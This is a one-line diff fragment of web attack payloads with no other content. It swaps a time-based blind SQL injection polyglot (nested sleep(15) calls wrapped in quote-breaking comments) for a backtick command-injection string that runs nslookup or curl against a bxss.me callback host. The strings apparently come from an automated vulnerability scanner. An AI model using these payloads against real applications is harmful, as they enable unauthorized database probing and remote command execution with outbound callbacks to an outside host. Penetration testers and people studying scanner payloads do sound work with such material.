@@ -1,1 +1,1 @@
-(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
+`(nslookup -q=cname hittuhdvmvdemc5934.bxss.me||curl hittuhdvmvdemc5934.bxss.me)`
